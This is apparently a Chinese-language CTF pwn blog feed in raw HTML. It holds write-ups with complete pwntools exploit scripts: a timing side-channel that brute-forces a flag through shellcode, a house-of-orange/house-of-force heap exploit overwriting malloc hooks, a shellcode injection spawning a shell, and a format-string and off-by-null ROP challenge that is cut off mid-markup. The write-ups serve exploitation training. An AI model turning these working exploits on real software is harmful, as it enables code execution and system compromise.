punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>                flag <span class="token operator">+=</span> j                <span class="token keyword">break</span>        li<span class="token punctuation">(</span><span class="token string">'flag = '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="二分法"><a href="#二分法" class="headerlink" title="二分法"></a>二分法</h3><p>如果字符范围较大可以使用二分法进行优化，即利用<code>ja</code>在大于的时候跳转到死循环，遍历<code>0x20-0x80</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>left <span class="token operator">=</span> <span class="token number">0</span>right <span class="token operator">=</span> <span class="token number">127</span>    <span class="token keyword">while</span> left <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>        <span class="token keyword">global</span> r        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn'</span><span class="token punctuation">)</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span>        sleep<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'rsp'</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        shellcode <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'''            mov al, byte ptr[rsi+</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">]            cmp al, </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">            ja $-2            ret        '''</span></span>        payload <span class="token operator">+=</span> asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'right'</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>clean<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time            li<span class="token punctuation">(</span><span class="token string">'time = '</span> <span class="token operator">+</span>  <span class="token builtin">str</span><span class="token punctuation">(</span>start_time<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span> <span class="token operator">+</span> <span class="token string">'char = '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>            r<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> start_time <span class="token operator">></span> <span class="token number">2</span><span class="token punctuation">:</span>            left <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            right <span class="token operator">=</span> mid        li<span class="token punctuation">(</span><span class="token string">'flag = '</span> <span class="token operator">+</span> flag<span class="token punctuation">)</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>left<span class="token punctuation">)</span>    <span class="token keyword">if</span> flag<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">:</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><p>陷入死循环一次<code>clean</code>时间在<code>2</code>秒，除了跳转到死循环的，在比较时不相同也是有时间差的，远程打的越久时间差越大，这种时候可以通过：增加<code>clean</code>的次数，每增加一次死循环后的时间<code>+2</code>，或者把爆破出来的内容添加到<code>flag</code>中之后重启远程。爆破出来的值也不完全准确，需要多次测试。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;沙箱禁用&lt;code&gt;write&lt;/code&gt;的时候可以通过&lt;code&gt;shellcode&lt;/code&gt;逐位爆破，先将&lt;code&gt;flag&lt;/</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="侧信道" scheme="https://starrysky1004.github.io/tags/%E4%BE%A7%E4%BF%A1%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>2024极客少年-PWN</title>
    <link href="https://starrysky1004.github.io/2024/08/10/2024-ji-ke-shao-nian-pwn/2024-ji-ke-shao-nian-pwn/"/>
    <id>https://starrysky1004.github.io/2024/08/10/2024-ji-ke-shao-nian-pwn/2024-ji-ke-shao-nian-pwn/</id>
    <published>2024-08-10T09:37:54.000Z</published>
    <updated>2024-08-10T09:44:39.369Z</updated>
    
    <content type="html"><![CDATA[<h3 id="orangeforce"><a href="#orangeforce" class="headerlink" title="orangeforce"></a>orangeforce</h3><p><code>house of orange + house of force</code>，无<code>edit</code>和<code>delete</code>，限制创建堆块数量六个，可以溢出<code>8</code>字节，创建堆块之前还要先创建一个<code>character</code>才能去创建堆</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">add_character</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> flag <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Your character has been created."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"Name: "</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">6uLL</span><span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>byte_202060<span class="token punctuation">,</span> <span class="token number">0x14uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  flag <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Created."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先利用<code>house of orange</code>缩小<code>top chunk</code>的大小，但要保证修改的大小加上<code>top chunk</code>的地址最后三位为<code>0</code>，再创建一个比<code>top chunk size</code>更大的堆使得<code>top chunk</code>被释放进<code>unsorted bin</code>，此时得到<code>libc</code>地址，最后申请一个堆获得堆地址</p><p>泄露完地址再利用<code>house of force</code>，改<code>top chunk size</code>为<code>-1</code>，再申请<code>target - top_chunk - 0x20</code>大小的堆，使得<code>top chunk</code>落在<code>target</code>，这里需要改<code>malloc_hook</code>，但是直接改<code>malloc_hook</code>为<code>ogg</code>不能打通，所以需要利用<code>realloc_hook</code>，即将<code>top chunk</code>落在<code>realloc_hook</code>，最后申请一个堆改<code>realloc_hook</code>为<code>ogg</code>、改<code>malloc_hook</code>为<code>realloc + 2</code></p><p>此时已经用掉了六个堆，还需要创建一次堆触发<code>ogg</code>，利用<code>scanf</code>输入很长一段字符串可以导致<code>scanf</code>内部扩展缓冲区从而调用<code>init_malloc</code>来分配更大的空间的特性在<code>scanf</code>时输入很长的内容来<code>malloc</code>触发<code>ogg</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add_c</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> STR<span class="token punctuation">,</span> DEF<span class="token punctuation">,</span> DEX<span class="token punctuation">,</span> ACC<span class="token punctuation">,</span> INT<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Name'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'STR'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>STR<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEF'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEF<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'DEX'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>DEX<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'ACC'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>ACC<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'INT'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>INT<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'Power'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add_c<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xd81</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>one <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2c5</span><span class="token punctuation">,</span> <span class="token number">0x4f322</span><span class="token punctuation">,</span> <span class="token number">0x10a38c</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> libc_base <span class="token operator">+</span> one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>realloc_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__realloc_hook'</span><span class="token punctuation">]</span>realloc <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'realloc'</span><span class="token punctuation">]</span>add<span class="token punctuation">(</span><span class="token number">0x1d0</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>top_chunk <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x21920</span>add<span class="token punctuation">(</span><span class="token number">0xb88</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0xb88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>size <span class="token operator">=</span> realloc_hook <span class="token operator">-</span> top_chunk <span class="token operator">-</span> <span class="token number">0x20</span>add<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x8</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>realloc <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span> <span class="token string">b'0'</span> <span class="token operator">*</span> <span class="token number">0x1000</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><p><code>exec</code>函数可以执行<code>shellcode</code>，但要通过<code>isAdmin</code>的判断，所以要先通过<code>Login</code>改<code>isAdmin</code>为<code>1</code>，<code>Login</code>中的<code>password</code>为<code>SuperSecurePassword123!</code>，而要用<code>Login</code>首先要把<code>v5</code>改成<code>0</code>，所以通过<code>Send Message to Admin</code>功能溢出<code>v4</code>将<code>v5</code>覆盖成<code>0</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span> <span class="token operator">*</span> <span class="token number">56</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Password'</span><span class="token punctuation">,</span> <span class="token string">b'SuperSecurePassword123!\x00'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Shellcode'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;orangeforce&quot;&gt;&lt;a href=&quot;#orangeforce&quot; class=&quot;headerlink&quot; title=&quot;orangeforce&quot;&gt;&lt;/a&gt;orangeforce&lt;/h3&gt;&lt;p&gt;&lt;code&gt;house of orange + house of f</summary>
      
    
    
    
    <category term="WP" scheme="https://starrysky1004.github.io/categories/WP/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="shellcode" scheme="https://starrysky1004.github.io/tags/shellcode/"/>
    
    <category term="heap" scheme="https://starrysky1004.github.io/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>2024WKCTF-PWN</title>
    <link href="https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/"/>
    <id>https://starrysky1004.github.io/2024/07/16/2024wkctf-pwn/2024wkctf-pwn/</id>
    <published>2024-07-16T08:41:29.000Z</published>
    <updated>2024-07-17T07:27:58.291Z</updated>
    
    <content type="html"><![CDATA[<p>题目下载地址：<a href="https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF">https://github.com/0xviol1t/CTF-challenges/tree/main/2024/WKCTF</a></p><h3 id="baby-stack"><a href="#baby-stack" class="headerlink" title="baby_stack"></a>baby_stack</h3><p><code>wait</code>中存在格式化字符串漏洞，随便测一下发现输入<code>6</code>的时候会输出一个<code>libc</code>上的地址从而得到基址，通过<code>libc</code>基址获取<code>one gadget</code>地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Bh] [rbp-85h] BYREF</span>  <span class="token keyword">char</span> format<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-80h] BYREF</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Press enter to continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">getc</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Pick a number: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  num <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">snprintf</span><span class="token punctuation">(</span>format<span class="token punctuation">,</span> <span class="token number">0x64uLL</span><span class="token punctuation">,</span> <span class="token string">"Your magic number is: %%%d$llx\n"</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span>format<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">introduce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>echo_inner</code>中存在栈上的<code>off-by-null</code>，在栈上布置<code>rop</code>并且通过输入长度控制将<code>\x00</code>写到<code>rbp</code>，返回到上层函数之后就会抬栈运行到布置的<code>rop</code>，为了确保执行到<code>ogg</code>需要将最后<code>8</code>位覆盖成<code>ogg</code>，前面全部覆盖成<code>ret</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">echo_inner</span><span class="token punctuation">(</span>_BYTE <span class="token operator">*</span>a1<span class="token punctuation">,</span> <span class="token keyword">int</span> size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  a1<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">fread</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> size<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You said:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" 